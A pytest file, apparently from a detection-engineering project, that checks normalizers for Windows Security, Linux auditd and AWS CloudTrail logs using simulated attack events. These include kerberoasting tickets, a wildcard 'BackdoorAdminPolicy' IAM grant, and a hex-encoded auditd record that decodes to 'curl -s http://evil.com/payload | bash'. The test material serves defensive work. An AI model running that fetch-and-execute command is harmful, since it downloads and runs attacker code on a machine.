"""
Unit & Integration Tests for Phase 2A/2D Telemetry Foundation & Normalization.
Verifies Windows Security EVD (4688, 4768, 4769), Linux Auditd, and AWS CloudTrail normalizers.
Asserts that all required dimensions (tenant, host, user, process, network, provenance, raw_ref)
are preserved with zero invented fields.
"""
import pytest
from detection_content.telemetry import (
    WindowsSecurityDSM,
    LinuxAuditdDSM,
    AWSCloudTrailDSM,
    TELEMETRY_DSM_REGISTRY,
)


def test_windows_security_4688_process_creation():
    raw_ev = {
        "EventID": 4688,
        "TimeCreated": "2026-09-04T12:00:00Z",
        "Computer": "WORKSTATION-01.corp.local",
        "EventData": {
            "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgA...",
            "ParentProcessName": "C:\\Windows\\explorer.exe",
            "SubjectUserName": "admin_jp",
            "SubjectDomainName": "CORP",
            "SubjectUserSid": "S-1-5-21-123456789-500",
            "TokenElevationType": "%%1937",
        },
    }

    dsm = TELEMETRY_DSM_REGISTRY.resolve(raw_ev)
    assert dsm is not None
    assert dsm.id == "windows-security-evd"

    parser = dsm.select_parser()
    parsed = parser.parse(raw_ev)
    assert parsed["event_id"] == 4688

    normalizer = dsm.select_normalizer()
    canonical = normalizer.normalize(
        parsed, dsm.id, "collector-01", "integ-win", "trace-test-1", tenant_id="tenant-corp"
    )

    # Invariants verification
    assert canonical["tenant_id"] == "tenant-corp"
    assert canonical["source_vendor"] == "Microsoft"
    assert canonical["event_type"] == "process_creation"
    assert canonical["process"]["name"] == "powershell.exe"
    assert canonical["process"]["command_line"] == "powershell.exe -enc SQBFAFgA..."
    assert canonical["process"]["parent_name"] == "explorer.exe"
    assert canonical["identity"]["username"] == "admin_jp"
    assert canonical["identity"]["domain"] == "CORP"
    assert canonical["identity"]["is_privileged"] is True
    assert canonical["host"]["hostname"] == "WORKSTATION-01.corp.local"
    assert canonical["provenance"]["trace_id"] == "trace-test-1"
    assert canonical["raw_ref"] == raw_ev


def test_windows_security_4768_kerberos_tgt():
    raw_ev = {
        "EventID": "4768",
        "TimeCreated": "2026-09-04T12:05:00Z",
        "Computer": "DC-01.corp.local",
        "EventData": {
            "TargetUserName": "svc_backup",
            "TargetDomainName": "CORP.LOCAL",
            "ServiceName": "krbtgt",
            "TicketOptions": "0x40810010",
            "TicketEncryptionType": "0x17",  # RC4 (AS-REP Roastable)
            "Status": "0x0",
            "IpAddress": "::ffff:192.168.1.50",
            "IpPort": "54321",
        },
    }

    dsm = TELEMETRY_DSM_REGISTRY.resolve(raw_ev)
    assert dsm is not None

    parser = dsm.select_parser()
    parsed = parser.parse(raw_ev)
    assert parsed["event_id"] == 4768

    normalizer = dsm.select_normalizer()
    canonical = normalizer.normalize(
        parsed, dsm.id, "collector-01", "integ-win", "trace-test-2"
    )

    assert canonical["event_type"] == "kerberos_tgt_request"
    assert canonical["identity"]["username"] == "svc_backup"
    assert canonical["network"]["src_ip"] == "192.168.1.50"
    assert canonical["network"]["src_port"] == 54321
    assert canonical["authentication"]["auth_type"] == "kerberos_as_rep"
    assert canonical["authentication"]["ticket_encryption"] == "0x17"
    assert canonical["authentication"]["status"] == "SUCCESS"


def test_windows_security_4769_kerberoasting():
    raw_ev = {
        "EventID": 4769,
        "TimeCreated": "2026-09-04T12:10:00Z",
        "Computer": "DC-01.corp.local",
        "EventData": {
            "TargetUserName": "attacker_user",
            "ServiceName": "MSSQLSvc/db01.corp.local:1433",
            "TicketOptions": "0x40810000",
            "TicketEncryptionType": "0x17",  # RC4
            "Status": "0x0",
            "IpAddress": "192.168.1.99",
            "IpPort": "49152",
        },
    }

    dsm = TELEMETRY_DSM_REGISTRY.resolve(raw_ev)
    assert dsm is not None

    parsed = dsm.select_parser().parse(raw_ev)
    canonical = dsm.select_normalizer().normalize(
        parsed, dsm.id, "collector-01", "integ-win", "trace-test-3"
    )

    assert canonical["event_type"] == "kerberos_service_ticket_request"
    assert canonical["authentication"]["service_name"] == "MSSQLSvc/db01.corp.local:1433"
    assert canonical["authentication"]["ticket_encryption"] == "0x17"
    assert canonical["network"]["src_ip"] == "192.168.1.99"


def test_linux_auditd_execve_unhex():
    # Hex encoded command: "curl -s http://evil.com/payload | bash" -> 6375726C202D7320...
    raw_ev = {
        "type": "SYSCALL",
        "syscall": "59",  # execve
        "exe": "/usr/bin/bash",
        "proctitle": "6375726C202D7320687474703A2F2F6576696C2E636F6D2F7061796C6F6164207C2062617368",
        "pid": "1337",
        "ppid": "1000",
        "uid": "0",
        "auid": "1001",
        "host": "prod-web-01",
    }

    dsm = TELEMETRY_DSM_REGISTRY.resolve(raw_ev)
    assert dsm is not None
    assert dsm.id == "linux-auditd"

    parsed = dsm.select_parser().parse(raw_ev)
    canonical = dsm.select_normalizer().normalize(
        parsed, dsm.id, "collector-linux", "integ-auditd", "trace-linux-1"
    )

    assert canonical["source_vendor"] == "Linux"
    assert canonical["source_product"] == "Auditd"
    assert canonical["process"]["name"] == "bash"
    assert canonical["process"]["executable_path"] == "/usr/bin/bash"
    # Unhexed proctitle check
    assert "curl -s http://evil.com/payload | bash" in canonical["process"]["command_line"]
    assert canonical["identity"]["is_privileged"] is True
    assert canonical["host"]["hostname"] == "prod-web-01"


def test_aws_cloudtrail_iam_escalation():
    raw_ev = {
        "eventVersion": "1.08",
        "eventTime": "2026-09-04T12:15:00Z",
        "eventSource": "iam.amazonaws.com",
        "eventName": "PutUserPolicy",
        "awsRegion": "us-east-1",
        "sourceIPAddress": "203.0.113.50",
        "userAgent": "aws-cli/2.15.0",
        "userIdentity": {
            "type": "IAMUser",
            "principalId": "AIDAEXAMPLEKEY",
            "arn": "arn:aws:iam::123456789012:user/developer_bob",
            "accountId": "123456789012",
            "userName": "developer_bob",
        },
        "requestParameters": {
            "userName": "developer_bob",
            "policyName": "BackdoorAdminPolicy",
            "policyDocument": '{"Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}',
        },
    }

    dsm = TELEMETRY_DSM_REGISTRY.resolve(raw_ev)
    assert dsm is not None
    assert dsm.id == "aws-cloudtrail"

    parsed = dsm.select_parser().parse(raw_ev)
    canonical = dsm.select_normalizer().normalize(
        parsed, dsm.id, "collector-aws", "integ-cloudtrail", "trace-aws-1"
    )

    assert canonical["source_vendor"] == "AWS"
    assert canonical["source_product"] == "CloudTrail"
    assert canonical["event_type"] == "cloud_audit"
    assert canonical["cloud"]["provider"] == "aws"
    assert canonical["cloud"]["action"] == "PutUserPolicy"
    assert canonical["cloud"]["account_id"] == "123456789012"
    assert canonical["identity"]["username"] == "developer_bob"
    assert canonical["network"]["src_ip"] == "203.0.113.50"
    assert canonical["additional_fields"]["event_name"] == "PutUserPolicy"
